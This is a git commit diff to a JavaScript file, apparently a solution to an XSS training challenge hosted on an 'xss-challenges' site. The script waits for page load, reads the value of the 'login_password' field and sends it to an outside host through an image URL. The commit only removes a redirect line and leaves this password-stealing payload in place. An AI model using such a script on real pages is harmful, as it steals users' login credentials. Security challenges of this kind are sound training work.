97e223585e26e1e2ebf1fd104eec9bceeaebf7f0
dlee20013 <dlee20013@gmail.com>
2017-04-25 02:11:05 -0700

    hello

--- part1/part_1.js
+++ part1/part_1.js
@@ -4,7 +4,6 @@ document.addEventListener("DOMContentLoaded", function() {
 		var img = new Image();
 		img.src = 'http://r7.io/e/davinl?s=' + document.getElementById("login_password").value;
 		console.log(img);
-		window.replace.href = "http://xss-challenges.r7.io/0/login";
 	};
 	var prob = document.getElementsByClassName("problem")[0];
 	var err = document.getElementsByClassName("error-message")[0];
